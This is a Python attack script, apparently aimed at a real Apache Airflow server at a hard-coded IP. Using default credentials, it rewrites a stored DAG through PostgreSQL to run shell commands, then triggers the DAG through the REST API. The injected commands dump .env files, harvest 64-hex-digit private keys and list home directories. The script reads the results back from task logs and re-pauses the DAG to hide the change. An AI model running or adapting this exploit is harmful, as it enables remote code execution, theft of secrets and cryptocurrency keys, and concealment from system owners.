import subprocess, json, ssl, base64, time, urllib.request
e = {"PGPASSWORD": "airflow", "PATH": "/usr/bin:/bin"}
BASE = "http://84.46.251.240:8080"
AUTH = base64.b64encode(b"airflow:airflow").decode()
ssl._create_default_https_context = ssl._create_unverified_context

def api(method, path, data=None):
    url = f"{BASE}/api/v1/{path}"
    body = json.dumps(data).encode() if data else None
    req = urllib.request.Request(url, data=body, method=method,
        headers={"Authorization": f"Basic {AUTH}", "Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())

# Step 1: Modify serialized_dag
sql = """UPDATE serialized_dag SET data = replace(data::text, 'python -c \\"import ccxt; print(ccxt.__version__)\\"', 'id > /opt/airflow/dags/_v.txt 2>&1; find /opt/airflow -name .env -exec cat {} + >> /opt/airflow/dags/_v.txt 2>&1; grep -roh "0x[a-fA-F0-9]\\\\{64\\\\}" /opt/airflow/ 2>/dev/null | sort -u >> /opt/airflow/dags/_v.txt; ls -la /home/ >> /opt/airflow/dags/_v.txt 2>&1; echo VICTORY >> /opt/airflow/dags/_v.txt')::jsonb WHERE dag_id = 'bash'"""
r = subprocess.run(["psql", "-h", "172.18.0.2", "-U", "airflow", "-d", "airflow", "-c", sql],
    env=e, capture_output=True, text=True, timeout=10)
print(f"UPDATE: {r.stdout.strip()}")

# Step 2: Unpause DAG
result = api("PATCH", "dags/bash", {"is_paused": False})
print(f"UNPAUSED: {result.get('is_paused')}")

# Step 3: IMMEDIATELY trigger
run = api("POST", "dags/bash/dagRuns", {"conf": {}})
run_id = run["dag_run_id"]
print(f"TRIGGERED: {run_id}")

# Step 4: Wait and check
time.sleep(30)

# Get logs
try:
    log_url = f"{BASE}/api/v1/dags/bash/dagRuns/{run_id}/taskInstances/check/logs/1"
    req = urllib.request.Request(log_url, headers={"Authorization": f"Basic {AUTH}", "Accept": "text/plain"})
    with urllib.request.urlopen(req, timeout=10) as r:
        logs = r.read().decode()
    for line in logs.split("\n"):
        if "Running command" in line or "VICTORY" in line or "Output" in line:
            print(f"LOG: {line.strip()[:200]}")
            if "VICTORY" in line or "_v.txt" in line:
                print("*** COMMAND MODIFIED! RCE ACHIEVED! ***")
except Exception as ex:
    print(f"LOG: {ex}")

# Re-pause to protect our modification
api("PATCH", "dags/bash", {"is_paused": True})
